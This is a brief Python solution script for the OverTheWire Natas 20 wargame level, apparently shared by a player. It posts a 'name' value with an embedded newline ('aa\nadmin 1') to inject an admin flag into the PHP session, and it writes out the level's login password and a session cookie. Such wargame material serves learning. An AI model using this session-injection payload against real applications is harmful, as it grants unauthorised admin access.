# Overthewire: Natas 20
# woanmeo11

import requests


url = 'http://natas20.natas.labs.overthewire.org/'
account = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
cookie = dict(PHPSESSID = 'm4guhdkbn5pppplmgov8kjd0b7')

r = requests.post(url, auth=account, cookies=cookie, data={'name': 'aa\nadmin 1'})
print(r.text)
